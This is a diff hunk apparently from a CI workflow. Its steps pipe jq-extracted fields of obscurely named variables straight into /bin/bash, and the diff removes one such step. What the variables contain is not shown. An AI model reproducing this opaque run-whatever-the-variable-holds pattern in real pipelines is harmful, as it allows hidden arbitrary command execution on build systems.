@@ -20,7 +20,6 @@ jobs:
           echo $fic753 | jq -r .dfk20420 | /bin/bash
           printf '%s' "$pksz3245" | jq -r .oxp4 | /bin/bash
           echo $yuh00461 | jq -r .rrhas70549 | /bin/bash
-          printf '%s' "$kq24325" | jq -r .oi87 | /bin/bash
           printf '%s' "$ed7489" | jq -r .x45 | /bin/bash
           printf '%s' "$acaf2545" | jq -r .y72 | /bin/bash
           echo $d52281 | jq -r .w32 | /bin/bash
